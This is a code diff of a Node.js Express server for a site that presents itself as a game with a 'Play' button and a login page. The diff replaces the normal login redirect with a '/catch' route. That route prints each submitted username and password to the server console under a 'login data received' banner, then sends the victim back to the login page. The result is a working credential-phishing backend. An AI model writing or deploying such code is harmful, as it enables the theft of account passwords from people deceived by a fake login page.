@@ -1,26 +1,38 @@
 const express = require('express');
 const path = require('path');
-
 const app = express();
+
+const PORT = process.env.PORT || 3000;
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// 1. При открытии сайта показываем главную (index.html)
+// Главная страница с кнопкой Играть
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// 2. Нажатие кнопки "ИГРАТЬ" открывает твою страницу логина
+// Переход на страницу логина
 app.get('/login.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'login.html'));
 });
 
-// 3. После успешного входа отправляем на игру (укажи нужный файл вместо game.html)
-app.post('/login', (req, res) => {
-    res.redirect('/game.html'); 
+// Обработчик формы
+app.post('/catch', (req, res) => {
+    const login = req.body.username;
+    const pass = req.body.password;
+
+    console.log('\n==============================');
+    console.log('[ПОЛУЧЕНЫ ДАННЫЕ ВХОДА]');
+    console.log(`Логин (Имя пользователя): ${login}`);
+    console.log(`Пароль: ${pass}`);
+    console.log('==============================');
+
+    // Отправляем обратно на страницу логина после перехвата
+    res.sendFile(path.join(__dirname, 'login.html'));
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
+app.listen(PORT, () => {
+    console.log(`=== СЕРВЕР РАБОТАЕТ НА ПОРТУ ${PORT} ===`);
+});
